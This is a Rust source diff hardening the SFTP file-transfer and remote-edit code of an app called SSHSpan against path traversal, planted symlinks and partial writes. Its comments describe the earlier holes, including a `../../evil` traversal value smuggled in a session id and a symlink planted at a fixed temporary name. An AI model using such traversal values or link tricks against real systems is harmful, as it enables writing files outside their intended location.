+    // Follow existing ancestors BEFORE creating anything: an already-planted
+    // link can point outside the destination, even when the file or the rest
+    // of the folder chain does not exist yet.
+    let resolved = resolved_local_path(path);
+    if !super::path_starts_with(&resolved, root_resolved) {
+        return Some("its local path resolves outside the destination folder".to_string());
+    }
+    if let Some(why) = local_path_shape_refusal(path) {
+        return Some(why.to_string());
+    }
+    sensitive
+        .path_refusal(path, &resolved, LocalAccess::Write)
+        .map(str::to_string)
+}
+
+/// A name the sanitizer leaves as it is - one it produced included (it is
+/// idempotent, see [`sanitize_remote_name`]).
+fn is_plain_local_name(name: &str) -> bool {
+    sanitize_remote_name(name).as_deref() == Some(name)
+}
+
+/// The write deny-list on a queued download's final local path, re-checked
+/// when the transfer starts: a job can be resumed long after it was queued
+/// (after a reconnect, after a restart). The protected locations are reused
+/// between jobs (see [`SensitiveLocations::current`]), so this resolves the
+/// job's own path only.
+pub(crate) fn local_write_refusal(path: &std::path::Path) -> Option<String> {
+    local_write_refusal_with(path, &SensitiveLocations::current())
+}
+
+fn local_write_refusal_with(
+    path: &std::path::Path,
+    sensitive: &SensitiveLocations,
+) -> Option<String> {
+    local_path_refusal(path, LocalAccess::Write, sensitive)
+}
+
+/// The rule [`sftp_download`] applies to its target: a path the user picked
+/// in the native save dialog (`granted`) only has to clear the base rules; any
+/// other path is a renderer-supplied string and gets the full write deny-list.
+fn check_download_target(
+    local: &str,
+    granted: bool,
+    sensitive: &SensitiveLocations,
+) -> CmdResult<()> {
+    let access = if granted {
+        LocalAccess::Basic
+    } else {
+        LocalAccess::Write
+    };
+    validate_sftp_local_path_with(local, access, sensitive)
+}
+
+/// Where an edit session stages its copy of `file_name`: a fresh, unguessable
+/// name directly inside `temp_dir`, re-checked like every other local path a
+/// remote name leads to. The prefix used to be the first 8 BYTES of the
+/// renderer-supplied session id, verbatim: `../../evil` put the copy two
+/// folders up, and a multi-byte character at byte 8 panicked the command.
+/// Only letters, digits and `-` of it are kept now.
+fn edit_stage_path(
+    temp_dir: &std::path::Path,
+    session_id: &str,
+    file_name: &str,
+    sensitive: &SensitiveLocations,
+) -> Result<PathBuf, String> {
+    let prefix: String = session_id
+        .chars()
+        .filter(|c| c.is_ascii_alphanumeric() || *c == '-')
+        .take(8)
+        .collect();
+    let prefix = if prefix.is_empty() { "edit" } else { &prefix };
+    let path = temp_dir.join(format!("{prefix}-{}", staged_file_name(file_name)));
+    match derived_local_refusal(temp_dir, &path, sensitive) {
+        None => Ok(path),
+        Some(why) => Err(format!(
+            "{file_name} cannot be opened for editing: the local copy at {} is refused ({why}).",
+            path.display()
+        )),
+    }
 }
 
 /// Refuse anything that touches a remote filesystem while the vault is locked.
@@ -546,10 +1122,43 @@ pub async fn sftp_remove(
     Ok(serde_json::json!({ "ok": true }))
 }
 
+/// Delete the remote folder `path` and everything in it (the recursive
+/// `sftp_remove`). A link is unlinked, never walked: deleting a link to a
+/// folder must not empty the folder it points to (READDIR follows a link).
+/// LSTAT says what `path` is; on a server that leaves the type bits out it
+/// is walked only when it resolves to itself (see [`resolves_to_itself`]).
+fn remove_remote_tree<'a>(
+    sftp: &'a russh_sftp::client::SftpSession,
+    path: &'a str,
+) -> Pin<Box<dyn Future<Output = Result<(), String>> + Send + 'a>> {
+    Box::pin(async move {
+        let md = sftp
+            .symlink_metadata(path)
+            .await
+            .map_err(|e| format!("stat {path}: {}", sftp_error_detail(e)))?;
+        let is_link = match classify_attrs(&md) {
+            Some(kind) => kind == EntryKind::Symlink,
+            None => !matches!(
+                resolves_to_itself(sftp, path, &mut RealFolder::default()).await,
+                Ok(true)
+            ),
+        };
+        if is_link {
+            return sftp
+                .remove_file(path)
+                .await
+                .map_err(|e| format!("rm {path}: {e}"));
+        }
+        remove_tree_below(sftp, path).await
+    })
+}
+
 /// Depth-first recursive delete of a remote directory tree. Children are
 /// removed before their parent (rmdir requires an empty dir). Symlinks are
 /// unlinked, never followed - `symlink_metadata` classifies the link itself.
-fn remove_remote_tree<'a>(
+/// An entry whose type the server leaves out is removed by
+/// [`remove_untyped`]: REMOVE first, a folder only if it resolves to itself.
+fn remove_tree_below<'a>(
     sftp: &'a russh_sftp::client::SftpSession,
     path: &'a str,
 ) -> Pin<Box<dyn Future<Output = Result<(), String>> + Send + 'a>> {
@@ -576,14 +1185,15 @@ fn remove_remote_tree<'a>(
                     continue;
                 }
             };
-            let ft = md.file_type();
-            let res = if ft.is_symlink() || !ft.is_dir() {
-                // Symlinks and plain files are unlinked; a symlink is never followed.
-                sftp.remove_file(&child)
+            let res = match classify_attrs(&md) {
+                Some(EntryKind::Dir) => remove_tree_below(sftp, &child).await,
+                // Links and everything else are unlinked; a link is never
+                // followed.
+                Some(_) => sftp
+                    .remove_file(&child)
                     .await
-                    .map_err(|e| format!("rm {child}: {e}"))
-            } else {
-                remove_remote_tree(sftp, &child).await
+                    .map_err(|e| format!("rm {child}: {e}")),
+                None => remove_untyped(sftp, &child).await,
             };
             if let Err(e) = res {
                 if first_err.is_none() {
@@ -601,6 +1211,30 @@ fn remove_remote_tree<'a>(
         }
         Ok(())
     })
+}
+
+/// Delete an entry whose type the server leaves out (its LSTAT said
+/// nothing). REMOVE first: it never follows a link, so a file or a link is
+/// simply gone - nothing to tell apart, and READLINK is not needed (it used
+/// to be, so a server without it kept every file). Only when REMOVE fails is
+/// the entry opened as a folder, and since that follows a link, it is
+/// emptied only when it resolves to itself (see [`resolves_to_itself`]);
+/// anything else is left, with REMOVE's error.
+async fn remove_untyped(sftp: &russh_sftp::client::SftpSession, child: &str) -> Result<(), String> {
+    let refused = match sftp.remove_file(child).await {
+        Ok(()) => return Ok(()),
+        Err(e) => format!("rm {child}: {e}"),
+    };
+    if probe_folder(sftp, child).await != EntryKind::Dir {
+        return Err(refused);
+    }
+    match resolves_to_itself(sftp, child, &mut RealFolder::default()).await {
+        Ok(true) => remove_tree_below(sftp, child).await,
+        Ok(false) => Err(format!(
+            "{refused} (it leads to a folder somewhere else, which was left alone)"
+        )),
+        Err(why) => Err(format!("{refused} ({why})")),
+    }
 }
 
 #[tauri::command]
@@ -663,12 +1297,14 @@ pub async fn sftp_set_mtime(
 /// queue's `dest_dir`, queue uploads' sources and the local-pane
 /// delete/rename/mkdir still take renderer-supplied paths that are checked
 /// only against it, so a compromised renderer can still write, read or delete
-/// anything the list does not name. (Only the destination DIRECTORY of a queue
-/// download is validated, not each file name inside it: a remote file called
-/// `.bashrc` downloaded into a home-directory `dest_dir` is not caught.)
-/// Closing that needs dialog-approved directories (`system_pick_directory` + a
-/// grant store with a TTL) and dialog-picked upload sources, which is a larger
-/// change.
+/// anything the list does not name. What the list does name is enforced on
+/// every local path a remote name leads to - each file and folder of a folder
+/// download, an edit session's staged copy, a queued download again when it
+/// starts (see [`derived_local_refusal`]) - and a delete or move of a folder
+/// that HOLDS a listed location (the home folder, say) is refused. Closing
+/// the rest needs dialog-approved directories (`system_pick_directory` + a
+/// grant store with a TTL) and dialog-picked upload sources, which is a
+/// larger change.
 #[tauri::command]
 pub async fn sftp_download(
     app: AppHandle,
@@ -677,12 +1313,8 @@ pub async fn sftp_download(
     local: String,
 ) -> CmdResult<serde_json::Value> {
     let sftp = sftp_from_session(&app, &session_id)?;
-    let access = if app.state::<super::DialogPathStore>().consume(&local) {
-        LocalAccess::Basic
-    } else {
-        LocalAccess::Write
-    };
-    validate_sftp_local_path(&local, access)?;
+    let granted = app.state::<super::DialogPathStore>().consume(&local);
+    check_download_target(&local, granted, &SensitiveLocations::current())?;
     download_to(&sftp, &remote, &local).await?;
     Ok(serde_json::json!({ "ok": true, "local": local }))
 }
@@ -709,20 +1341,70 @@ pub async fn sftp_download(
 /// dialog - left a truncated file where the original had been. Any failure now
 /// deletes the partial and leaves `local` exactly as it was. (The edit-staging
 /// flow shares this function; its names are fresh, so it just gains the
-/// atomic finish.)
+/// atomic finish.) The staged copy is fsynced before that rename, so a crash
+/// right after it cannot leave an empty or partial file under the final name.
+///
+/// Only a file is downloaded: a folder, or a pipe, socket or device (opening
+/// a pipe for reading blocks the server until a writer appears), is refused
+/// from its type before anything is opened - on a server that leaves the
+/// type bits out, after asking (see [`picked_root_kind`]).
 pub async fn download_to(
     sftp: &russh_sftp::client::SftpSession,
     remote: &str,
     local: &str,
 ) -> Result<(), CmdError> {
+    download_to_hashed(sftp, remote, local).await.map(drop)
+}
+
+/// What [`download_to_hashed`] fetched.
+struct Downloaded {
+    /// SHA-256 of the bytes written - computed while writing them, so a change
+    /// made to the local file right after the rename is not mistaken for them.
+    sha256: String,
+    /// The remote file as the STAT the download was based on saw it.
+    stamp: RemoteStamp,
+    /// Its permission bits (`st_mode & 0o7777`).
+    mode: Option<u32>,
+}
+
+/// [`download_to`], also returning what was downloaded. A server that reports
+/// no size is read to its end (it used to give an empty file).
+async fn download_to_hashed(
+    sftp: &russh_sftp::client::SftpSession,
+    remote: &str,
+    local: &str,
+) -> Result<Downloaded, CmdError> {
+    use sha2::{Digest, Sha256};
     use tokio::io::AsyncReadExt;
 
-    let size = sftp
+    let md = sftp
         .metadata(remote)
         .await
-        .map_err(|e| describe_sftp_error("stat", e))?
-        .size
-        .unwrap_or(0);
+        .map_err(|e| describe_sftp_error("stat", e))?;
+    match picked_root_kind(sftp, remote, &md).await {
+        EntryKind::Dir => {
+            return Err(CmdError(format!(
+                "{remote} is a folder, not a file - download folders with Download, which copies everything in them."
+            )))
+        }
+        EntryKind::Other => {
+            return Err(CmdError(format!(
+                "{remote} is not a regular file (a pipe, socket or device), so it cannot be downloaded."
+            )))
+        }
+        // Never opened on a guess: it could be a folder, or a pipe whose
+        // read blocks the server.
+        EntryKind::Unknown => {
+            return Err(CmdError(format!(
+                "Could not tell whether {remote} is a file or a folder (the server does not say), so it was not downloaded."
+            )))
+        }
+        EntryKind::File | EntryKind::Symlink => {}
+    }
+    // Unknown size: read to the end (`u64::MAX` = no clamp, no completeness
+    // check), like the queue does.
+    let size = md.size.unwrap_or(u64::MAX);
+    let mut hasher = Sha256::new();
 
     let mut remote_file = sftp
         .open(remote)
@@ -754,15 +1436,22 @@ pub async fn download_to(
             .write_all(&buf[..n])
             .await
             .map_err(|e| CmdError(format!("local write failed: {e}")))?;
+        hasher.update(&buf[..n]);
         done += n as u64;
     }
     local_file
         .flush()
         .await
         .map_err(|e| CmdError(format!("local flush failed: {e}")))?;
+    local_file
+        .sync_all()
+        .await
+        .map_err(|e| CmdError(format!("local fsync failed: {e}")))?;
+    #[cfg(test)]
+    tests::note_download_step(local, "fsync");
     drop(local_file);
 
-    if done < size {
+    if size != u64::MAX && done < size {
         return Err(CmdError(format!(
             "download incomplete: got {done} of {size} bytes from {remote}"
         )));
@@ -777,11 +1466,17 @@ pub async fn download_to(
     }
     // The whole file is in: only now does it replace the destination (an
     // atomic rename over an existing file on every platform std supports).
+    #[cfg(test)]
+    tests::note_download_step(local, "rename");
     tokio::fs::rename(&part, local)
         .await
         .map_err(|e| CmdError(format!("local rename failed: {e}")))?;
     part_guard.0 = None;
-    Ok(())
+    Ok(Downloaded {
+        sha256: format!("{:x}", hasher.finalize()),
+        stamp: RemoteStamp::of(&md),
+        mode: md.permissions.map(|m| m & 0o7777),
+    })
 }
 
 /// Deletes a staged `.part` file when dropped unless disarmed (set to `None`):
@@ -965,71 +1660,314 @@ fn is_edit_trigger(event: &notify::Event, staged_name: &std::ffi::OsStr) -> bool
     }
 }
 
-/// What one file-watcher callback means for an edit: `Ok(true)` a save,
-/// `Ok(false)` an unrelated event, `Err` the watcher itself reporting a problem
-/// (dropped events, a vanished directory...). The error is surfaced - the
-/// caller logs it - rather than discarded: a watcher that has died looks
-/// exactly like "the user never saved", and the edit would silently stop
-/// syncing.
+/// What one file-watcher callback means for an edit.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum WatchVerdict {
+    /// The staged file was saved.
+    Save,
+    /// The watcher lost events and cannot say what happened: the staged file
+    /// has to be compared with what the server holds.
+    Rescan,
+    /// Something else in the staging folder.
+    Unrelated,
+}
+
+/// What one file-watcher callback means for an edit; `Err` is the watcher
+/// itself reporting a problem (a vanished directory...). The error is
+/// surfaced - the caller logs it - rather than discarded: a watcher that has
+/// died looks exactly like "the user never saved", and the edit would
+/// silently stop syncing.
 fn watch_verdict(
     result: Result<notify::Event, notify::Error>,
     staged_name: &std::ffi::OsStr,
-) -> Result<bool, String> {
+) -> Result<WatchVerdict, String> {
     match result {
-        Ok(event) => Ok(is_edit_trigger(&event, staged_name)),
+        // notify 7 reports a lost-events overflow as an event carrying the
+        // Rescan flag (inotify's IN_Q_OVERFLOW, FSEvents' rescan), whatever
+        // path it names - the save may be among what was lost.
+        Ok(event) if event.need_rescan() => Ok(WatchVerdict::Rescan),
+        Ok(event) if is_edit_trigger(&event, staged_name) => Ok(WatchVerdict::Save),
+        Ok(_) => Ok(WatchVerdict::Unrelated),
         Err(e) => Err(e.to_string()),
     }
 }
 
-/// The payload of the `sftp-edit-sync` event: the outcome of one upload of an
-/// edited file, so a save is never silently lost.
-fn edit_sync_event(
-    session_id: &str,
-    remote: &str,
-    result: &Result<u64, String>,
-) -> serde_json::Value {
-    match result {
-        Ok(_) => serde_json::json!({ "sessionId": session_id, "remote": remote, "ok": true }),
-        Err(error) => serde_json::json!({
-            "sessionId": session_id, "remote": remote, "ok": false, "error": error,
-        }),
+/// What a remote file was when an edit session last agreed with it (the
+/// download, a sync-back, an Overwrite or a Reload): a different size or
+/// modification time at the next sync-back means someone else changed it.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
+struct RemoteStamp {
+    size: Option<u64>,
+    mtime: Option<u32>,
+}
+
+impl RemoteStamp {
+    fn of(md: &russh_sftp::protocol::FileAttributes) -> Self {
+        Self {
+            size: md.size,
+            mtime: md.mtime,
+        }
     }
 }
 
+/// Why a save was held back for the user to decide.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum ConflictReason {
+    /// The remote file's size or time differs from what the session last
+    /// agreed with.
+    Changed,
+    /// The remote file is gone.
+    Deleted,
+    /// The server reports neither size nor time, and the file is too large to
+    /// compare by content.
+    Unverifiable,
+}
+
+impl ConflictReason {
+    fn as_str(self) -> &'static str {
+        match self {
+            Self::Changed => "changed",
+            Self::Deleted => "deleted",
+            Self::Unverifiable => "unverifiable",
+        }
+    }
+}
+
+/// A conflict reported to the user (`sftp-edit-sync` with `conflict: true`)
+/// and not resolved yet. `sftp_edit_resolve` must name it by `id`, and an
+/// Overwrite goes ahead only while the remote file is still as reported.
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct PendingConflict {
+    id: String,
+    reason: ConflictReason,
+    /// The remote file as reported (no size or time when it was deleted).
+    remote: RemoteStamp,
+    /// SHA-256 of the remote content as reported, when the conflict was
+    /// found by content (a server that reports neither size nor time).
+    remote_sha256: Option<String>,
+    /// SHA-256 of the local copy when it was last reported (not sent).
+    local: String,
+}
+
+/// How the remote file differed from what the session last agreed with.
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct Differs {
+    reason: ConflictReason,
+    remote: RemoteStamp,
+    /// SHA-256 of its content, when it was compared by content.
+    remote_sha256: Option<String>,
+}
+
+/// A sync-back that did not go through.
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct FailedSync {
+    /// SHA-256 of the content it was for; `None` when the staged copy could
+    /// not be read at all.
+    local: Option<String>,
+    error: String,
+}
+
+/// What an edit remembers about sync-backs that did not go through (see
+/// [`EditSync::on_change`]).
+#[derive(Default)]
+struct SyncRetry {
+    /// The watcher saw a save since the last attempt: it gets an attempt
+    /// even for content that already failed.
+    save_seen: std::sync::atomic::AtomicBool,
+    /// The last failure, reported once.
+    failure: std::sync::Mutex<Option<FailedSync>>,
+    /// The temporary file a failed swap left on the server (with the complete
+    /// new content). It is removed before the next attempt makes another, so
+    /// an edit never leaves more than one.
+    kept_temp: std::sync::Mutex<Option<String>>,
+}
+
+/// The remote file of an edit as one STAT found it.
+enum RemoteNow {
+    Present(RemoteStamp),
+    Deleted,
+    /// The check itself failed; why.
+    Failed(String),
+}
+
+/// What a sync-back's check of the remote file found.
+enum Check {
+    /// As the session last agreed with it: the save may go in.
+    Agrees,
+    /// Changed, deleted or not comparable: held back for the user.
+    Differs(Differs),
+    /// The check failed; nothing is uploaded.
+    Failed(String),
+}
+
+/// Content of a remote file compared by hash when its server reports neither
+/// size nor time - at most this many bytes.
+const EDIT_COMPARE_MAX_BYTES: u64 = 16 * 1024 * 1024;
+
+/// What one sync-back or resolution came to - reported in an `sftp-edit-sync`
+/// event so a save is never silently lost or silently forced over someone
+/// else's change.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum SyncOutcome {
+    /// The saved file is on the server.
+    Uploaded,
+    /// It is not; why.
+    Failed(String),
+    /// Not uploaded: held back for the user to decide.
+    Conflict {
+        name: String,
+        conflict: PendingConflict,
+    },
+    /// The local copy was replaced by the server's version.
+    Reloaded,
+}
+
+/// The payload of the `sftp-edit-sync` event.
+fn edit_sync_event(
+    session_id: &str,
+    edit_id: &str,
+    remote: &str,
+    outcome: &SyncOutcome,
+) -> serde_json::Value {
+    let mut event = serde_json::json!({
+        "sessionId": session_id, "editId": edit_id, "remote": remote,
+    });
+    let fields = match outcome {
+        SyncOutcome::Uploaded => serde_json::json!({ "ok": true }),
+        SyncOutcome::Failed(error) => serde_json::json!({ "ok": false, "error": error }),
+        SyncOutcome::Conflict { name, conflict } => serde_json::json!({
+            "ok": false,
+            "conflict": true,
+            "conflictId": conflict.id,
+            "reason": conflict.reason.as_str(),
+            "error": match conflict.reason {
+                ConflictReason::Changed => format!(
+                    "{name} changed on the server since you opened it - choose Overwrite or Reload."
+                ),
+                ConflictReason::Deleted => format!(
+                    "{name} was deleted on the server since you opened it - choose Overwrite to put your copy back, or close it."
+                ),
+                ConflictReason::Unverifiable => format!(
+                    "SSHSpan cannot tell whether {name} changed on the server (the server reports neither its size nor its time, and the file is too large to compare) - choose Overwrite or Reload."
+                ),
+            },
+            "remoteSize": conflict.remote.size,
+            "remoteModifiedMs": conflict.remote.mtime.map(|s| i64::from(s) * 1000),
+        }),
+        SyncOutcome::Reloaded => serde_json::json!({ "ok": true, "reloaded": true }),
+    };
+    if let (Some(event), Some(fields)) = (event.as_object_mut(), fields.as_object()) {
+        event.extend(fields.clone());
+    }
+    event
+}
+
+/// What the user chose for an edit whose remote file changed meanwhile.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum EditResolution {
+    /// Upload the local copy over the server's version.
+    Overwrite,
+    /// Replace the local copy with the server's version.
+    Reload,
+}
+
+impl EditResolution {
+    fn parse(action: &str) -> Result<Self, String> {
+        match action {
+            "overwrite" => Ok(Self::Overwrite),
+            "reload" => Ok(Self::Reload),
+            other => Err(format!(
+                "Unknown action {other:?} - expected \"overwrite\" or \"reload\"."
+            )),
+        }
+    }
+}
+
+/// The message when the renderer refers to an edit session that has ended.
+const EDIT_SESSION_ENDED: &str =
+    "This edit session has ended (closed, or the vault was locked) - open the file again.";
+
+/// SHA-256 (hex) of a local file, read off the async runtime.
+async fn sha256_file(path: &std::path::Path) -> std::io::Result<String> {
+    let path = path.to_path_buf();
+    tokio::task::spawn_blocking(move || {
+        use sha2::{Digest, Sha256};
+        let mut file = std::fs::File::open(&path)?;
+        let mut hasher = Sha256::new();
+        std::io::copy(&mut file, &mut hasher)?;
+        Ok(format!("{:x}", hasher.finalize()))
+    })
+    .await
+    .map_err(std::io::Error::other)?
+}
+
+/// What one upload of an edited file wrote.
+#[derive(Debug, Clone, Copy)]
+struct EditUpload {
+    bytes: u64,
+    /// The new file as LSTAT saw it just before it was renamed into place -
+    /// the baseline later saves are compared with (taken before the rename,
+    /// so a change made right after it is still noticed).
+    stamp: RemoteStamp,
+}
+
 /// Upload an edited local file over `target` without ever truncating the live
-/// remote file: the bytes go to `<target>.sshspan-tmp`, are checked, and only
-/// then renamed into place. The old code opened `target` itself with
+/// remote file: the bytes go to a temporary file next to it, are checked, and
+/// only then renamed into place. The old code opened `target` itself with
 /// CREATE|TRUNCATE and never closed it, so a connection drop mid-sync left a
 /// TRUNCATED remote file while the editor showed a saved one.
 ///
-/// Returns the number of bytes uploaded. On any failure before the swap the
-/// temporary file is removed (if the server refuses even that, the error says
-/// where the leftover is) and the original is untouched; if the swap itself
-/// fails the error says where the new content is. `mode` (the permission bits
-/// the remote file had when it was opened) is put back on the new file - a
+/// The temporary name is `<target>.sshspan-tmp-<random>` - fresh for every
+/// save, so nothing can be planted for it - and it is created EXCLUSIVELY: it
+/// used to be the fixed `<target>.sshspan-tmp`, opened with CREATE|TRUNCATE,
+/// so a link planted there by another user of a shared folder was written
+/// THROUGH (into its target), a planted file was truncated, and the rename
+/// then deleted the real file and put the link in its place (F1).
+///
+/// On any failure before the swap the temporary file this call created is
+/// removed (if the server refuses even that, the error says where the
+/// leftover is) and the original is untouched; if the swap itself fails the
+/// error says where the new content is. `mode` (the permission bits the
+/// remote file had when it was opened) is put back on the new file - a
 /// rename replaces the inode, and an executable script must stay executable.
-async fn upload_edited_file(
+///
+/// `tmp` is the temporary name to use - fresh from [`edit_temp_name`]: the
+/// edit session picks it, so it knows which file a failed swap left (see
+/// [`EditSync::upload`]).
+async fn upload_edited_file_as(
     sftp: &russh_sftp::client::SftpSession,
     local: &std::path::Path,
     target: &str,
     mode: Option<u32>,
-) -> Result<u64, String> {
+    tmp: &str,
+) -> Result<EditUpload, String> {
     use russh_sftp::protocol::OpenFlags;
     use tokio::io::AsyncWriteExt;
 
     let lf = tokio::fs::File::open(local)
         .await
         .map_err(|e| format!("could not read the saved file: {e}"))?;
-    let tmp = format!("{target}{EDIT_TMP_SUFFIX}");
-    let mut rf = sftp
+    let tmp = tmp.to_string();
+    // EXCLUSIVE: an existing name is never truncated or written through, and
+    // it is not ours - it is never removed either.
+    let mut rf = match sftp
         .open_with_flags(
             &tmp,
-            OpenFlags::CREATE | OpenFlags::TRUNCATE | OpenFlags::WRITE,
+            OpenFlags::CREATE | OpenFlags::EXCLUDE | OpenFlags::WRITE,
         )
         .await
-        .map_err(|e| format!("could not create {tmp}: {}", sftp_error_detail(e)))?;
+    {
+        Ok(rf) => rf,
+        Err(_) if sftp.symlink_metadata(&tmp).await.is_ok() => {
+            return Err(format!(
+                "A temporary file is in the way: {tmp} already exists on the server. Nothing \
+                 was changed - move or delete it, then save again."
+            ))
+        }
+        Err(e) => return Err(format!("could not create {tmp}: {}", sftp_error_detail(e))),
+    };
 
-    // Everything up to the swap: stage a COMPLETE copy and prove it is whole.
+    // Stage a COMPLETE copy.
     let staged: Result<u64, String> = async {
         let copied = tokio::io::copy_buf(
             &mut tokio::io::BufReader::with_capacity(256 * 1024, lf),
@@ -1047,32 +1985,58 @@ async fn upload_edited_file(
         rf.shutdown()
             .await
             .map_err(|e| format!("upload did not finish cleanly: {e}"))?;
-        let size = sftp
-            .metadata(&tmp)
-            .await
-            .map_err(|e| format!("could not verify {tmp}: {}", sftp_error_detail(e)))?
-            .size;
-        if size != Some(copied) {
-            return Err(format!(
-                "{tmp} holds {} of {copied} bytes",
-                size.map_or_else(|| "an unknown number".to_string(), |s| s.to_string())
-            ));
-        }
         Ok(copied)
     }
     .await;
+    // An error in copy or flush exits BEFORE shutdown sent CLOSE; close that
+    // handle and wait for its response before deleting the temp file. On
+    // Win32-OpenSSH it cannot be deleted while our handle is open. (`File`'s
+    // Drop only queues a CLOSE without awaiting it.) A second CLOSE when the
+    // error came after shutdown is harmless and is answered as "unknown
+    // handle" - the first CLOSE already released it.
+    if staged.is_err() {
+        if let Err(e) = rf.close().await {
+            // `close` consumes the handle: if a pending write acknowledgement
+            // made shutdown fail before CLOSE, its Drop queues the CLOSE
+            // before the REMOVE below (requests on a channel are ordered).
+            log::debug!("[sshspan-sftp] close of failed edit temp {tmp}: {e}");
+        }
+    } else {
+        drop(rf);
+    }
     let copied = match staged {
         Ok(copied) => copied,
         Err(e) => {
-            // Nothing replaced anything yet: drop the partial copy. If even
+            // Nothing replaced anything yet: delete the partial copy. If even
             // that is refused, say where the leftover is instead of leaving it
             // on the server unannounced.
-            return Err(match sftp.remove_file(&tmp).await {
+            return Err(match remove_edit_temp(sftp, &tmp).await {
                 Ok(()) => e,
                 Err(rm) => format!("{e} (temp file left at {tmp}: {})", sftp_error_detail(rm)),
             });
         }
     };
+    // Prove it is whole - and still the regular file this call wrote: LSTAT,
+    // never STAT (which follows a link swapped in after the CLOSE). A file
+    // that is no longer ours is left alone.
+    let written = regular_file_attrs(sftp, &tmp, Some(copied))
+        .await
+        .map_err(|why| format!("{why}, so {target} was not replaced"))?;
+    // A server that reports no size cannot be checked here; the flush and
+    // the CLOSE above already confirmed every write.
+    if written.size.is_some_and(|size| size != copied) {
+        let short = format!(
+            "{tmp} holds {} of {copied} bytes",
+            written.size.unwrap_or_default()
+        );
+        return Err(match remove_edit_temp(sftp, &tmp).await {
+            Ok(()) => short,
+            Err(rm) => format!(
+                "{short} (temp file left at {tmp}: {})",
+                sftp_error_detail(rm)
+            ),
+        });
+    }
 
     if let Some(mode) = mode {
         let attrs = russh_sftp::protocol::FileAttributes {
@@ -1087,76 +2051,558 @@ async fn upload_edited_file(
     // The swap. If it fails the new content is complete at `tmp` (and the
     // original may be gone if only the second half of the retry failed), so
     // the temp file is KEPT and the message says where it is.
-    crate::sftp::queue::rename_over(sftp, &tmp, target)
+    crate::sftp::queue::rename_over(sftp, &tmp, target, Some(copied))
         .await
         .map_err(|d| format!("could not replace {target}: {d} (the saved content is at {tmp})"))?;
-    Ok(copied)
+    Ok(EditUpload {
+        bytes: copied,
+        stamp: RemoteStamp::of(&written),
+    })
 }
 
-/// One live edit watch, as the sync task needs it.
-struct EditSync {
+/// [`upload_edited_file_as`] with a fresh temporary name.
+#[cfg(all(test, unix))]
+async fn upload_edited_file(
+    sftp: &russh_sftp::client::SftpSession,
+    local: &std::path::Path,
+    target: &str,
+    mode: Option<u32>,
+) -> Result<EditUpload, String> {
+    upload_edited_file_as(sftp, local, target, mode, &edit_temp_name(target)).await
+}
+
+/// A fresh name for an edit upload's temporary file next to `target`.
+fn edit_temp_name(target: &str) -> String {
+    format!(
+        "{target}{EDIT_TMP_SUFFIX}-{}",
+        uuid::Uuid::new_v4().simple()
+    )
+}
+
+/// Delete an edit upload's temporary remote file AFTER its handle is closed.
+/// One short retry if the v3 status could mean a Windows sharing violation:
+/// OpenSSH maps EACCES to PermissionDenied and other errors to Failure; v3
+/// does not carry the underlying Win32 error number. A permanent refusal is
+/// still reported with the leftover's path.
+async fn remove_edit_temp(
+    sftp: &russh_sftp::client::SftpSession,
+    path: &str,
+) -> Result<(), russh_sftp::client::error::Error> {
+    use russh_sftp::protocol::StatusCode;
+    match sftp.remove_file(path).await {
+        Err(e) if sftp_status(&e, &[StatusCode::PermissionDenied, StatusCode::Failure]) => {
+            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
+            sftp.remove_file(path).await
+        }
+        other => other,
+    }
+}
+
+/// One live edit session: the staged copy, the remote file it syncs back to,
+/// and what the session knows about both.
+pub(crate) struct EditSync {
     sftp: Arc<russh_sftp::client::SftpSession>,
     session_id: String,
+    /// The renderer's handle on this session (events, `sftp_edit_resolve`).
+    edit_id: String,
     /// The path the user opened: what events and the registry are keyed by.
     remote: String,
     /// What is actually written: `remote` with symbolic links resolved, so
     /// editing through a link updates the file it points at instead of
     /// replacing the link with a regular file.
     target: String,
-    local: PathBuf,
+    /// The local copy the editor works on.
+    staged: Arc<crate::sftp::StagedCopy>,
     /// The remote file's permission bits when it was opened.
     mode: Option<u32>,
     emit: Arc<dyn Fn(serde_json::Value) + Send + Sync>,
-    stopped: Arc<std::sync::atomic::AtomicBool>,
+    stopped: std::sync::atomic::AtomicBool,
     debounce: EditDebounce,
-    /// Uploads of one file never overlap: two writers on the same temporary
-    /// path would interleave.
+    /// Sync-backs and resolutions of one file never overlap: two writers on
+    /// the same temporary path would interleave.
     upload_lock: tokio::sync::Mutex<()>,
+    /// The remote file as of the last time this session agreed with it.
+    baseline: std::sync::Mutex<RemoteStamp>,
+    /// SHA-256 of the content the server holds as far as this session knows
+    /// (`None`: unknown, so the next save uploads).
+    synced: std::sync::Mutex<Option<String>>,
+    /// The conflict reported to the user and not resolved yet.
+    pending: std::sync::Mutex<Option<PendingConflict>>,
+    /// Sync-backs that did not go through (see [`Self::on_change`]).
+    retry: SyncRetry,
 }
 
 impl EditSync {
-    /// A change to the staged file was seen: once the burst settles, upload it
-    /// once and report the outcome (success AND failure).
+    pub(crate) fn edit_id(&self) -> &str {
+        &self.edit_id
+    }
+
+    /// The edit ended (closed, session gone, vault locked): no more uploads,
+    /// and the staged copy is discarded.
+    pub(crate) fn end(&self) {
+        self.stopped.store(true, Ordering::SeqCst);
+        self.staged.discard();
+    }
+
+    fn is_stopped(&self) -> bool {
+        self.stopped.load(Ordering::SeqCst)
+    }
+
+    /// The file name the user sees in messages.
+    fn display_name(&self) -> &str {
+        self.remote.rsplit('/').next().unwrap_or(&self.remote)
+    }
+
+    fn report(&self, outcome: &SyncOutcome) {
+        (self.emit)(edit_sync_event(
+            &self.session_id,
+            &self.edit_id,
+            &self.remote,
+            outcome,
+        ));
+    }
+
+    /// React to what the watcher saw. A rescan (the watcher's queue
+    /// overflowed and events were lost - notify 7 reports that as an event
+    /// with the Rescan flag, not as an error) is handled like a save: the
+    /// staged file is hashed and compared with what the server holds, so a
+    /// save lost in the overflow still syncs, and nothing is sent when
+    /// nothing changed.
+    async fn react(self: Arc<Self>, verdict: WatchVerdict) {
+        match verdict {
+            WatchVerdict::Save => {
+                // A save always gets an attempt (see `on_change`).
+                self.retry.save_seen.store(true, Ordering::SeqCst);
+                self.on_change().await
+            }
